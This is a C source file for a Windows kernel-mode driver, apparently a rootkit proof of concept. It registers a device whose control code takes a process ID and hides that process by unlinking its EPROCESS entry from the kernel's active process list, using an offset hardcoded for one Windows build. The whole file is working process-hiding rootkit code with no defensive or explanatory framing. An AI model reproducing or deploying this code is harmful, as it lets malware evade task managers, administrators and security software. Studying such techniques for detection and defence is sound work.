
#include <ntifs.h>
#include <stdlib.h>

#define ACTIVE_PROCLIST_OFFSET	0x2e8


#define DBG_TRACE(src, msg)\
DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[%s]: %s\n", src, msg)

#define DBG_PRINT(fmt, msg)\
DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, fmt, msg)


#define RK_DKOM		0x00008001


#define DKOM_CODE CTL_CODE\
(RK_DKOM, 0x801, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)




UNICODE_STRING DeviceName	= RTL_CONSTANT_STRING(L"\\Device\\DKOM_sys");
UNICODE_STRING SymLink		= RTL_CONSTANT_STRING(L"\\DosDevices\\DKOM_sys");
PDEVICE_OBJECT pDeviceObject = NULL;

// placeholder
NTSTATUS dispatchPlaceholder
(
	IN PDEVICE_OBJECT	DriverObject,
	IN PIRP				IRP
)
{
	UNREFERENCED_PARAMETER(DriverObject);
	
	((*IRP).IoStatus).Status = STATUS_SUCCESS;
	((*IRP).IoStatus).Information = 0;

	IoCompleteRequest(IRP, IO_NO_INCREMENT);


	return (STATUS_SUCCESS);

}


void hideDKOM(PVOID pidString)
{
	

	
	PEPROCESS Process;
	NTSTATUS ntStatus = STATUS_SUCCESS;
	PLIST_ENTRY CurrListEntry, PrevListEntry, NextListEntry;
	ULONG pid;
	
	pid = atoi(pidString);

	if (pid == 0)
	{
		DBG_TRACE("hideDKOM", "Cannot convert PID string");
		return;
	}



	DBG_PRINT("hideDKOM: hidding %d\n", pid);


	ntStatus = PsLookupProcessByProcessId((HANDLE)pid, &Process);

	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("hideDKOM", "PsLookupProcessByProcessId failed");
		return;
	}

	DBG_PRINT("EPROCESS -> %lx\n", Process);

	

	// get ActiveProcessLinks addresss
	// hardcode offset for this windows build
	CurrListEntry = (PLIST_ENTRY)((PCHAR)Process + ACTIVE_PROCLIST_OFFSET);
	PrevListEntry = CurrListEntry->Blink;
	NextListEntry = CurrListEntry->Flink;

	DBG_PRINT("Hiding PID: %d\n", pid);

	// DKOM

	PrevListEntry->Flink = CurrListEntry->Flink;
	NextListEntry->Blink = CurrListEntry->Blink;

	CurrListEntry->Blink = CurrListEntry;
	CurrListEntry->Flink = CurrListEntry;

	DBG_TRACE("hideDKOM", "Process has been hidden");

	ObDereferenceObject(Process);

	return;

}


// IRP_MJ_DEVICE_CONTROL

NTSTATUS dispatchDKOM
(
	IN PDEVICE_OBJECT	DriverObject,
	IN PIRP				IRP
	)
{
	UNREFERENCED_PARAMETER(DriverObject);

	NTSTATUS ntStatus = STATUS_SUCCESS;
	PIO_STACK_LOCATION irpStack;

	ULONG ioctrlCode;
	PVOID inputBuffer;

	irpStack = IoGetCurrentIrpStackLocation(IRP);

	
	inputBuffer		= (*IRP).AssociatedIrp.SystemBuffer;
	ioctrlCode		= (*irpStack).Parameters.DeviceIoControl.IoControlCode;
	

	switch (ioctrlCode)
	{
		case DKOM_CODE:
		{
			DBG_TRACE("dispatchDKOM", "Incoming DKOM_CODE...");
			hideDKOM(inputBuffer); // PID
			
		}break;
		
		default:
		{
			DBG_TRACE("dispatchDKOM", "Unknown I/O code");
		}break;
	
	}

	
	(*IRP).IoStatus.Information = 0;
	IoCompleteRequest(IRP, IO_NO_INCREMENT);
	return ntStatus;



}


NTSTATUS Unload(IN PDRIVER_OBJECT DriverObject)
{
	IoDeleteSymbolicLink(&SymLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	return (STATUS_SUCCESS);
}

NTSTATUS DriverEntry
(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING regPath
)
{

	UNREFERENCED_PARAMETER(regPath);

	NTSTATUS ntStatus = STATUS_SUCCESS;
	int i;


	// set placeholder dispatch routine
	for (i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
		(*DriverObject).MajorFunction[i] = dispatchPlaceholder;

	(*DriverObject).MajorFunction[IRP_MJ_DEVICE_CONTROL] = dispatchDKOM;


	ntStatus = IoCreateDevice
		(
			DriverObject,
			0,
			&DeviceName,
			RK_DKOM,				// device type
			FILE_DEVICE_SECURE_OPEN,
			FALSE,
			&pDeviceObject
		);

	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("DriverEntry", "Failed to create Device");
		return ntStatus;
	}

	ntStatus = IoCreateSymbolicLink(&SymLink, &DeviceName);

	if (!NT_SUCCESS(ntStatus))
	{
		DBG_TRACE("DriverEntry", "Failed to create symlink");
		return ntStatus;
	}

	(*DriverObject).DriverUnload = Unload;

	return ntStatus;
}
